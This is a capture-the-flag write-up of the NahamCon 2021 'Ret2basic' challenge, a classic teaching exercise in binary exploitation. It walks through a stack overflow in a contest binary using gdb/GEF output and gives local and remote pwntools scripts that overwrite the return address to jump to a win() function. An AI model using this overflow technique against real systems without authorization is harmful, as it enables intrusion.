---
title: "NahamCon2021 CTF - Ret2basic"
date: 2021-03-15T16:39:53+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

binary exploitation - easy

## solution

The file we download is a ELF executable.

```text
$ file ret2basic
ret2basic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ca85eae693fed659275c0eed9c313e7f0083b85, for GNU/Linux 4.4.0, not stripped
```

Running it hints the vuln.

```text
$ ./ret2basic
Can you overflow this?: AAAA
Nope :(
$
$ ./ret2basic
Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    9615 segmentation fault  ./ret2basic
$
```

Disassembling the binary, we find that `main()` eventually calls `vuln` where the overflow exists.

{{< figure src="/images/nahamcon/ret2basic_vuln.png" >}}

A function called `win()` also exists, which will read the flag to us if we could reach it.

{{< figure src="/images/nahamcon/ret2basic_win.png" >}}

In `gdb` we can see the overflow smashing the stack, causing the `ret` from `vuln()` to crash.

{{< figure src="/images/nahamcon/ret2basic_rsp.png" >}}

The binary does not have an executable stack, but we can replace the address at the right location so that the `ret` call redirects the program counter to `win()`.

```text
gef➤  checksec
[+] checksec for 'ret2basic'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

We can get the address of `win()` with `p win`.

```text
gef➤  p win
$1 = {<text variable, no debug info>} 0x401215 <win>
```

To find the exact location in the input buffer where the address to `ret` to should be, we can use a cycling buffer. I used the built in `pattern create` tool in GEF to feed to `ret2basic`.

```text
gef➤  pattern offset $rsp
[+] Searching '$rsp'
[+] Found at offset 120 (little-endian search) likely
[+] Found at offset 113 (big-endian search)
gef➤
```

We can confirm the location by running it again with 120 `A`'s and 8 `B`'s. If `rsp` has the `B`'s, we good.

```text
gef➤  x/g $rsp
0x7fffffffe328: 0x4242424242424242
gef➤
```

Simple. To make exploitation easier, I used [pwntools](https://github.com/Gallopsled/pwntools) to write an exploit locally first, then remotely.

The local exploit was:

```python
from pwn import *

elf = context.binary = ELF("ret2basic")
win = p64(elf.symbols.win)

io = process(elf.path)
payload = b"A"*120 + win
io.sendline(payload)
io.interactive()
```

Running that resulted in a successful call to `win()`, but obviously a failed flag read as it wasn't the remote service. The remote version follows which successfully read the flag.

```python
from pwn import *

elf = context.binary = ELF("ret2basic")
win = p64(elf.symbols.win)

payload = b"A"*120 + win

conn = remote("challenge.nahamcon.com", 30159)
conn.sendline(payload)
conn.interactive()
```

{{< figure src="/images/nahamcon/ret2basic_pwn.png" >}}
